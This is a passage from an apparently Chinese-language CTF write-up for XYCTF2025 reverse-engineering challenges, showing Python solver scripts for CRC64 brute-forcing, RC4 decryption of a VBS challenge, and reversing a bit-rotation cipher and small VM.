class="hljs-number">0x1E</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <br>  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB6</span>, <br>  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFC</span>, <br>  <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xC3</span>, <br>  <span class="hljs-number">0x73</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x38</span>, <br>  <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE6</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x92</span>, <br>  <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3A</span>, <br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9B</span>]<br><span class="hljs-comment"># print(len(data)) # 96</span><br>target =[<br>    <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-built_in">bytes</span>(data[i:i+<span class="hljs-number">8</span>]),<span class="hljs-string">&#x27;little&#x27;</span>,)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">96</span>,<span class="hljs-number">8</span>)<br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crc64</span>(<span class="hljs-params">enc</span>):<br>    crc=<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> enc:<br>        crc ^= (byte &lt;&lt; <span class="hljs-number">56</span>)<br>        crc &amp;= <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> crc &amp;(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">63</span>): <br>                crc = (crc &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x42F0E1EBA9EA3693</span><br>            <span class="hljs-keyword">else</span>:<br>                crc &lt;&lt;= <span class="hljs-number">1</span><br>        crc &amp;= <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> crc ^ <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span> <span class="hljs-comment">#取反</span><br><span class="hljs-comment">#爆破</span><br>flag=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:<br>    found =<span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10000</span>):<br>        byte0 = j &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment">#低字节</span><br>        byte1 = (j &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-comment">#高字节</span><br>        temp = <span class="hljs-built_in">bytes</span>([byte0,byte1])<br>        <br>        crc_val = crc64(temp)<br>        <span class="hljs-keyword">if</span> crc_val == i:<br>            flag.append(temp)<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br><br>final =<span class="hljs-string">b&#x27;&#x27;</span>.join(flag).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag is : <span class="hljs-subst">&#123;final&#125;</span>&quot;</span>)<br>    <br></code></pre></td></tr></table></figure><p>flag 为<code>flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</code></p><h3 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h3><p>附件是一个 <code>.vbs</code> 文件,是一种包含用Visual Basic Scripting Edition编写的脚本代码的文本文件,不需要编译，直接由Windows Script Host (WSH)解释执行<br>在网上看到相关处理方式是:用 vscode 或者 其他文本编辑器打开，把开头的 <strong>Execute</strong> 改为 <strong>wscript.echo</strong><br>直接运行即可得到源代码</p><blockquote><p>Execute 是用来执行代码<br>wscript.echo 的作用是将一个或多个字符串作为输出打印到控制台（或者在图形界面中弹出一个对话框）</p></blockquote><p>运行后果然看到了源代码<br><img src="/../images/XYCTF2025/w1.png"><br>不难看出这是一个标准的 rc4 ，<br>密文是  “90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4”<br>密钥是<br>“rc4key”<br>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext_hex, key_string</span>):<br> <br>    <span class="hljs-keyword">try</span>:<br>        ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;WRONG FORMAT&quot;</span><br><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    key_length = <span class="hljs-built_in">len</span>(key_string)<br>    T = [<span class="hljs-built_in">ord</span>(key_string[i % key_length]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>    <br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + T[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i] <br>        <br>    key_stream = []<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ciphertext:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]  <br>        t = (S[i] + S[j]) % <span class="hljs-number">256</span><br>        key_stream.append(S[t])<br>        <br>    plaintext_bytes = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)):<br>        plaintext_bytes.append(ciphertext[i] ^ key_stream[i])<br>        <br>  <br>    <span class="hljs-keyword">return</span> plaintext_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>ciphertext_given = <span class="hljs-string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span><br><br>key = <span class="hljs-string">&quot;rc4key&quot;</span><br><br>decrypted_text = rc4_decrypt(ciphertext_given, key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag is: <span class="hljs-subst">&#123;decrypted_text&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Flag is: flag&#123;We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn&#x27;s_chall_is_r3@lly_gr3@t_&amp;_fuN!&#125;</span><br></code></pre></td></tr></table></figure><p>题目中说 flag为flag{}包含的内容进行md5加密并用XYCTF{}包含<br><img src="/../images/XYCTF2025/w2.png"><br>所以最终的 flag 为 <code>XYCTF&#123;5f9f46c147645dd1e2c8044325d4f93c&#125;</code></p><h3 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h3><p>静态看一堆 sub，于是打断点动调找函数逻辑，调试时发现了一个可疑的函数 sub_100001B70<br>前面有好几个do while 循环，这是在打印题目叙述部分<br><img src="/../images/XYCTF2025/l1.png"><br>打印结束后读取输入并对输入做了一些处理<br><img src="/../images/XYCTF2025/l2.png"><br>然后进入一个 switch case ，这是一个小的 vm<br><img src="/../images/XYCTF2025/l3.png"><br>操作码在 word_100015470，长度为 3 个字节<br><img src="/../images/XYCTF2025/l4.png"><br>每个 case 点进去都对应一个操作，三字节一组的opcode，第一个数是 case 的情况，第二个是 input 的索引值 index，第三个是操作数，从 opcode 就可以看出其实涉及到的 case 就只有三个，case 1、case 2 和 case 8,分别对应的操作是 加法、减法和异或<br><img src="/../images/XYCTF2025/l7.png"><br><img src="/../images/XYCTF2025/l8.png"><br><img src="/../images/XYCTF2025/l9.png"></p><p>再往下走是一个加密和比较，比较之后同开始一样是输出一些字符串<br>比较处找到密文，一共 40 字节<br><img src="/../images/XYCTF2025/l6.png"><br>然后看加密部分，是一个循环移位,把密文分成 10 组，每组 4 字节<br><img src="/../images/XYCTF2025/l5.png"><br>简化一下它的逻辑</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v5</span>[<span class="hljs-number">0</span>] = input[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">3</span> | input[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">5</span><br><span class="hljs-attribute">v5</span>[<span class="hljs-number">1</span>] = input[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">3</span> | input[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">5</span><br><span class="hljs-attribute">v5</span>[<span class="hljs-number">2</span>] = input[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">3</span> | input[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">5</span><br><span class="hljs-attribute">v5</span>[<span class="hljs-number">3</span>] = input[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">3</span> | input[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>解密 enc1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># v5[0] = input[1] &lt;&lt; 3 | input[2] &gt;&gt; 5</span><br><span class="hljs-comment"># v5[1] = input[2] &lt;&lt; 3 | input[3] &gt;&gt; 5</span><br><span class="hljs-comment"># v5[2] = input[3] &lt;&lt; 3 | input[0] &gt;&gt; 5</span><br><span class="hljs-comment"># v5[3] = input[0] &lt;&lt; 3 | input[1] &gt;&gt; 5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">o0, o1, o2, o3</span>):<br>    a = ((o2 &amp; <span class="hljs-number">0x07</span>) &lt;&lt; <span class="hljs-number">5</span>) | ((o3 &amp; <span class="hljs-number">0xF8</span>) &gt;&gt; <span class="hljs-number">3</span>)<br>    b = ((o3 &amp; <span class="hljs-number">0x07</span>) &lt;&lt; <span class="hljs-number">5</span>) | ((o0 &amp; <span class="hljs-number">0xF8</span>) &gt;&gt; <span class="hljs-number">3</span>)<br>    c = ((o0 &amp; <span class="hljs-number">0x07</span>) &lt;&lt; <span class="hljs-number">5</span>) | ((o1 &amp; <span class="hljs-number">0xF8</span>) &gt;&gt; <span class="hljs-number">3</span>)<br>    d = ((o1 &amp; <span class="hljs-number">0x07</span>) &lt;&lt; <span class="hljs-number">5</span>) | ((o2 &amp; <span class="hljs-number">0xF8</span>) &gt;&gt; <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">return</span> a, b, c, d<br><br><span class="hljs-comment"># &amp; 0x07 和 &amp; 0xF8 分别是为了提取低三位和高五位</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_data</span>(<span class="hljs-params">enc</span>):<br>    dec = [<span class="hljs-number">0</span>] * <span class="hljs-number">40</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):  <br>        i = <span class="hljs-number">4</span> * k<br>        o0 = enc[i]<br>        o1 = enc[i+<span class="hljs-number">1</span>]<br>        o2 = enc[i+<span class="hljs-number">2</span>]<br>        o3 = enc[i+<span class="hljs-number">3</span>]<br>        a, b, c, d = decrypt_block(o0, o1, o2, o3)<br>        dec[i]   = a<br>        dec[i+<span class="hljs-number">1</span>] = b<br>        dec[i+<span class="hljs-number">2</span>] = c<br>        dec[i+<span class="hljs-number">3</span>] = d<br>    <span class="hljs-keyword">return</span> dec<br><br>enc_data = [<br>    <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x8B</span>,<br>    <span class="hljs-number">0x73</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x31</span>,<br>    <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x22</span>,<br>    <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x51</span><br>]<br><br>decrypted_data = decrypt_data(enc_data)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data (hex):&quot;</span>, [<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> decrypted_data])<br><br>decrypted_bytes = <span class="hljs-built_in">bytes</span>(decrypted_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data as bytes:&quot;</span>, decrypted_bytes)<br><br><br><span class="hljs-comment"># Decrypted data (hex): [&#x27;0x63&#x27;, &#x27;0x69&#x27;, &#x27;0x55&#x27;, &#x27;0x73&#x27;, &#x27;0x66&#x27;, &#x27;0x4c&#x27;, &#x27;0x36&#x27;, &#x27;0x3e&#x27;, &#x27;0x7d&#x27;, &#x27;0x7a&#x27;, &#x27;0x31&#x27;, &#x27;0x6e&#x27;, &#x27;0x64&#x27;, &#x27;0x5d&#x27;, &#x27;0x2e&#x27;, &#x27;0x6d&#x27;, &#x27;0x66&#x27;, &#x27;0x30&#x27;, &#x27;0x30&#x27;, &#x27;0x64&#x27;, &#x27;0x5f&#x27;, &#x27;0x79&#x27;, &#x27;0x63&#x27;, &#x27;0x64&#x27;, &#x27;0x30&#x27;, &#x27;0x24&#x27;, &#x27;0xb8&#x27;, &#x27;0x50&#x27;, &#x27;0x40&#x27;, &#x27;0x6e&#x27;, &#x27;0x64&#x27;, &#x27;0x5f&#x27;, &#x27;0x69&#x27;, &#x27;0x33&#x27;, &#x27;0x89&#x27;, &#x27;0x6b&#x27;, &#x27;0x6a&#x27;, &#x27;0x32&#x27;, &#x27;0xf0&#x27;, &#x27;0xfb&#x27;]</span><br><span class="hljs-comment"># Decrypted data as bytes: b&#x27;ciUsfL6&gt;&#125;z1nd].mf00d_ycd0$\xb8P@nd_i3\x89kj2\xf0\xfb&#x27;</span><br></code></pre></td></tr></table></figure><p>得到中间结果 <code>ciUsfL6&gt;&#125;z1nd].mf00d_ycd0$\xb8P@nd_i3\x89kj2\xf0\xfb</code></p><p>接下来看那个小型 vm,整理之后如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=[<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x09</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x06</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x0E</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x04</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x02</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x02</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0D</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0F</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x07</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x07</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x7E</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x02</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x0B</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x09</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x06</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x07</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x06</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x04</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x0E</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x77</span><br><br>]<br><br><span class="hljs-built_in">input</span> = [<span class="hljs-number">0</span>] * <span class="hljs-number">40</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(opcode),<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">0x01</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] += opcode[i+<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] += <span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x02</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] -= opcode[i+<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] -= <span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x03</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] *= opcode[i+<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x04</span>:<br>        <span class="hljs-keyword">if</span> opcode[i+<span class="hljs-number">2</span>] != <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] //= opcode[i+<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x05</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] %= opcode[i+<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x06</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] &amp;= opcode[i+<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x07</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] |= opcode[i+<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">elif</span> opcode[i] == <span class="hljs-number">0x08</span>:<br>        <span class="hljs-built_in">input</span>[opcode[i+<span class="hljs-number">1</span>]] ^= opcode[i+<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;input[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] ^= <span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>打印出它的过程</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 